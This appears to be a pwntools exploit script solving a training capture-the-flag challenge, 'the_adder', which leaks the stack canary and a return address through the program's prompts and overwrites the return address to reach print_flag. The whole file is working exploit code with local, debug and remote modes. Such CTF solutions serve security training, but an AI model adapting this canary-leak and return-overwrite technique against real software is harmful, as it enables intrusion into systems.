from pwn import *

CHALL_PATH = "./the_adder"
COMMANDS = """
brva 0x15C0
b print_flag
c
"""

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    c = remote("the-adder.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

for i in range(1, 11):
    c.recvuntil(b"> ")
    c.sendline(b"1")

    c.recvuntil(b"Number: ")
    c.sendline(b"1")

    c.recvuntil(b"[y/n]\n")
    c.sendline(b"y")

c.recvuntil(b"> ")
c.sendline(b"1")

c.recvuntil(b"Number: ")
c.sendline(b"c")

c.recvuntil(b"Are you sure you want me to add ")
canary = int(c.recvuntil("?")[0:-1])
print(hex(canary))
c.sendline(b"n")


c.recvuntil(b"> ")
c.sendline(b"1")

c.recvuntil(b"Number: ")
c.sendline(str(canary - 10))
c.recvuntil(b"[y/n]\n")
c.sendline(b"y")


c.recvuntil(b"> ")
c.sendline(b"1")


c.recvuntil(b"Number: ")
c.sendline(b"1")
c.recvuntil(b"[y/n]\n")
c.sendline(b"y")

c.recvuntil(b"> ")
c.sendline(b"1")

c.recvuntil(b"Number: ")
c.sendline(b"c")

c.recvuntil(b"Are you sure you want me to add ")
ret_address = int(c.recvuntil("?")[0:-1])
print(hex(ret_address))
c.sendline(b"n")

c.recvuntil(b"> ")
c.sendline(b"1")

c.recvuntil(b"Number: ")
off_print = 0x1309
off_adder = 0x1417
distance = off_adder - off_print
new_add = ret_address - distance
c.sendline(str(new_add - canary - 1))
c.recvuntil(b"[y/n]\n")
c.sendline(b"y")

c.recvuntil(b"> ")
c.sendline(b"3")

c.interactive()
    
